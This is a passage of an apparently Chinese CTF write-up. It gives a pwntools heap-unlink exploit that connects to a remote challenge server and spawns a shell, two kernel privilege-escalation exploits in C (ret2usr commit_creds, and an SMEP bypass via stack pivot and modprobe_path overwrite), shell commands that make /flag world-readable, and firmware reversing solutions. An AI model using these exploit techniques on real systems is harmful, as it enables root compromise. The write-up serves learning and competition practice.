class="params">(index)</span>:</span></span><br><span class="line">sh.send(<span class="string">'1'</span>.ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sh.send(str(index).ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sh.send(<span class="string">'2'</span>.ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sh.send(str(index).ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sh.send(<span class="string">'3'</span>.ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sh.send(str(index).ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./undlcv')</span></span><br><span class="line">sh=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10013</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">sh.send(<span class="string">'4'</span>.ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x403480</span><span class="number">-0x18</span>)+p64(<span class="number">0x403480</span><span class="number">-0x10</span>)+<span class="string">"a"</span>*<span class="number">0xd0</span>+p64(<span class="number">0xf0</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x18</span>+p64(<span class="number">0x4032a0</span>)+p64(<span class="number">0x403440</span>))</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">5</span>)+p64(<span class="number">0x4034a0</span>)+p64(<span class="number">6</span>)+p64(<span class="number">0x403450</span>))</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x401030</span>)+p64(<span class="number">0x401030</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">1</span>)+p32(<span class="number">0x12</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">0</span>)+<span class="string">"system\x00"</span>)</span><br><span class="line">pause()</span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="内核安全"><a href="#内核安全" class="headerlink" title="内核安全"></a>内核安全</h3><h4 id="1-ddkernel"><a href="#1-ddkernel" class="headerlink" title="1.ddkernel"></a>1.ddkernel</h4><p>题目没开smep也没有kaslr。查看ko文件，发现是一个栈溢出，长度检测只检测了最低的字节，保证长度最低字节小于8即可。查看/proc/kallsyms得到相关地址后就可以commit_creds(prepare_kernel_cred)接返回用户态的system(‘/bin/sh’)一把梭。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_regs</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">root</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs,user_ss,user_rsp,user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,i;</span><br><span class="line"><span class="keyword">char</span> rop[<span class="number">0x100</span>];</span><br><span class="line">save_regs();</span><br><span class="line">fd=<span class="built_in">open</span>(<span class="string">"/proc/doudou"</span>,O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">rop[i]=<span class="string">'a'</span>;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">16</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)root;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">24</span>]=<span class="number">0xFFFFFFFF81536FFB</span>;<span class="comment">//swapgs;ret</span></span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">32</span>]=<span class="number">0xFFFFFFFF8100C33A</span>;<span class="comment">//iretq</span></span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">40</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">48</span>]=user_cs;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">56</span>]=user_eflags;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">64</span>]=user_rsp;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">72</span>]=user_ss;</span><br><span class="line"><span class="built_in">write</span>(fd,rop,<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_regs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"movq %%cs,%0;"</span></span><br><span class="line"><span class="string">"movq %%ss,%1;"</span></span><br><span class="line"><span class="string">"movq %%rsp,%2;"</span></span><br><span class="line"><span class="string">"pushf;"</span></span><br><span class="line"><span class="string">"popq %3;"</span></span><br><span class="line">:<span class="string">"=r"</span>(user_cs),<span class="string">"=r"</span>(user_ss),<span class="string">"=r"</span>(user_rsp),<span class="string">"=r"</span>(user_eflags)::<span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* (*p_k_c)(<span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*c_c)(<span class="keyword">char</span>*);</span><br><span class="line">p_k_c=<span class="number">0xffffffff8105d157</span>;<span class="comment">//prepare_kernel_cred</span></span><br><span class="line">c_c=<span class="number">0xffffffff8105d235</span>;<span class="comment">//commit_creds</span></span><br><span class="line">c_c(p_k_c(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-babycall"><a href="#2-babycall" class="headerlink" title="2.babycall"></a>2.babycall</h4><p>这道题开启了smep但是没开启kaslr。相关函数地址无法直接通过cat /proc/kallsyms查看，可以先将init文件中的gid改为0再查看。</p><p>漏洞点在于我们可以更改vuln处存储的地址，然后通过调用号为0x10001的ioctl调用来执行该处地址代码。我们将vuln处改为一个gadget的地址0xffffffff813a3618，选择这个gadget是因为它是8字节对齐的而且ret后面跟的参数也是8字节对齐的，满足栈地址的要求。它执行xchg eax,esp可以实现栈迁移，由于xchg会将不交换的那部分字节置0，所以rsp就会到用户空间中去，我们事先mmap对应位置0x813a3000处的内存空间出来，在其中可以布置好rop链。</p><p>由于vmlinux中没有提权所需的函数，所以采取更改modprobe_path的方式提权，利用ROP将modprobe_path处改为/sem.sh即可，这里使用了mov [rsi],rdx这种gadget。运行完exp程序，只要执行以下命令即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#39;#!&#x2F;bin&#x2F;sh\n&#x2F;bin&#x2F;chmod 777 &#x2F;flag&#39; &gt; &#x2F;sem.sh</span><br><span class="line">chmod +x &#x2F;sem.sh</span><br><span class="line">echo -ne &#39;\xff\xff\xff\xff&#39; &gt; &#x2F;sir</span><br><span class="line">chmod +x &#x2F;sir</span><br><span class="line">&#x2F;sir</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure><p>sem.sh会把flag权限改为所有人可读，然后执行一个非法的elf文件就可以触发执行modprobe_path处存储的sem.sh，最终能够读取到flag。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_regs</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">root</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs,user_ss,user_rsp,user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,i;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">30</span>],b[<span class="number">9</span>]=<span class="string">"deadbeef"</span>,*rop;<span class="comment">//mod_tree ffffffff82606a80   run_cmd ffffffff810bd625   xchg 0xffffffff813a3618</span></span><br><span class="line"><span class="keyword">char</span> *pop_rdi=<span class="number">0xFFFFFFFF81026CAD</span>,*pop_rsi=<span class="number">0xFFFFFFFF8131422E</span>,*pop_rdx=<span class="number">0xFFFFFFFF81512EF6</span>,*mov_crsi_rdx=<span class="number">0xffffffff8103d348</span>,*modprobe=<span class="number">0xFFFFFFFF8265BE00</span>;</span><br><span class="line"><span class="keyword">char</span> path[<span class="number">16</span>]=<span class="string">"/sem.sh\x00"</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">b[i]=b[i]-<span class="string">'a'</span>+<span class="number">10</span>;</span><br><span class="line">*(<span class="keyword">char</span>**)&amp;b[<span class="number">8</span>]=<span class="number">0xffffffff813a3618</span>;</span><br><span class="line">save_regs();</span><br><span class="line">fd=<span class="built_in">open</span>(<span class="string">"/dev/babycall"</span>,O_RDWR);</span><br><span class="line">ioctl(fd,<span class="number">0x10001</span>,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1\n"</span>);</span><br><span class="line"></span><br><span class="line">rop=mmap(<span class="number">0x813a3000</span>,<span class="number">0x4000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>,rop);</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">0</span>+<span class="number">0x618</span>]=pop_rdx;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">8</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=<span class="number">0x68732e6d65732f</span>;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">16</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=pop_rsi;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">24</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=modprobe;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">32</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=mov_crsi_rdx;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">40</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=<span class="number">0xFFFFFFFF810728C4</span>;<span class="comment">//swapgs;pop rbp</span></span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">48</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=<span class="number">0</span>;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">56</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=<span class="number">0xFFFFFFFF810374EB</span>;<span class="comment">//iretq</span></span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">64</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=(<span class="keyword">char</span>*)get_shell;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">72</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=user_cs;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">80</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=user_eflags;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">88</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=user_rsp;</span><br><span class="line">*(<span class="keyword">char</span> **)&amp;rop[<span class="number">96</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=user_ss;</span><br><span class="line">ioctl(fd,<span class="number">0x10001</span>,rop);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_regs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"movq %%cs,%0;"</span></span><br><span class="line"><span class="string">"movq %%ss,%1;"</span></span><br><span class="line"><span class="string">"movq %%rsp,%2;"</span></span><br><span class="line"><span class="string">"pushf;"</span></span><br><span class="line"><span class="string">"popq %3;"</span></span><br><span class="line">:<span class="string">"=r"</span>(user_cs),<span class="string">"=r"</span>(user_ss),<span class="string">"=r"</span>(user_rsp),<span class="string">"=r"</span>(user_eflags)::<span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* (*p_k_c)(<span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*c_c)(<span class="keyword">char</span>*);</span><br><span class="line">p_k_c=<span class="number">0xffffffff810bd150</span>;<span class="comment">//prepare_kernel_cred</span></span><br><span class="line">c_c=<span class="number">0xffffffff810bcd60</span>;<span class="comment">//commit_creds</span></span><br><span class="line">c_c(p_k_c(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1\n"</span>);</span><br><span class="line"><span class="comment">//echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' &gt; /sem.sh</span></span><br><span class="line"><span class="comment">//chmod +x /sem.sh</span></span><br><span class="line"><span class="comment">//echo -ne '\xff\xff\xff\xff' &gt; /sir</span></span><br><span class="line"><span class="comment">//chmod +x /sir</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="固件安全"><a href="#固件安全" class="headerlink" title="固件安全"></a>固件安全</h3><h4 id="1-nodemcu"><a href="#1-nodemcu" class="headerlink" title="1.nodemcu"></a>1.nodemcu</h4><p>直接记事本打开搜索flag字符串就可以得到flag。</p><h4 id="2-stm"><a href="#2-stm" class="headerlink" title="2.stm"></a>2.stm</h4><p>先使用BinToHex将文件转为intel HEX的格式，用ida打开，将Processor type设置成ARM Big-endian，然后在Processor options中edit architecture options选择ARMv7-M。</p><p>然后在里面一通瞎找，找到hello world字符串，找到调用其的位置就是主要逻辑。关键的加密位于0x314。它将0x344开始的42个字节与0x1E异或后加3，这就是flag了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/16/j6mHsrz8wtnJYx7.png" alt="image-20210201172116449" title="">                </div>                <div class="image-caption">image-20210201172116449</div>            </figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">b"\x7D\x77\x40\x7A\x66\x30\x2A\x2F\x28\x40\x7E\x30\x33\x34\x2C\x2E\x2B\x28\x34\x30\x30\x7C\x41\x34\x28\x33\x7E\x30\x34\x33\x33\x30\x7E\x2F\x31\x2A\x41\x7F\x2F\x28\x2E\x64"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">flag=flag+chr((x^<span class="number">0x1e</span>)+<span class="number">3</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="3-easybios"><a href="#3-easybios" class="headerlink" title="3.easybios"></a>3.easybios</h4><p>ida打开查看所有字符串，看到有lzma的字样，说明被lzma压缩了。010editor打开查找5D 00 00 00，将之后的内容复制出来，并把末尾大量的0xFF删去，此时可以成功解压缩。</p><p>解压缩后用ida打开，查找运行bios输入flag错误时出现的字符串Wrong!，要按宽字符查找才能找到。成功定位到关键逻辑后，发现是一个rc4加密，密钥为OVMF_And_Easy_Bios。解密出字节串后变更为16进制字符串的形式就是flag了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_KEY 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_STR 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pos_i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> pos_j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sbox[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[MAX_KEY]=<span class="string">"OVMF_And_Easy_Bios"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encryption</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext,<span class="keyword">unsigned</span> <span class="keyword">char</span> *result)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[MAX_STR]=&#123;<span class="number">0x46</span>,<span class="number">0x77</span>,<span class="number">0x74</span>,<span class="number">0xB0</span>,<span class="number">0x27</span>,<span class="number">0x8E</span>,<span class="number">0x8F</span>,<span class="number">0x5B</span>,<span class="number">0xE9</span>,<span class="number">0xD8</span>,<span class="number">0x46</span>,<span class="number">0x9C</span>,<span class="number">0x72</span>,<span class="number">0xE7</span>,<span class="number">0x2F</span>,<span class="number">0x5E</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> result[MAX_STR]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    encryption((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)str,(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)result);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> key_len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)key);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)</span><br><span class="line">        sbox[i]=i;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)&#123;</span><br><span class="line">        j=(j+sbox[i]+key[i%key_len])%<span class="number">256</span>;</span><br><span class="line">        temp = sbox[i];</span><br><span class="line">        sbox[i] = sbox[j];</span><br><span class="line">        sbox[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line"></span><br><span class="line">    pos_i=(pos_i+<span class="number">1</span>)%<span 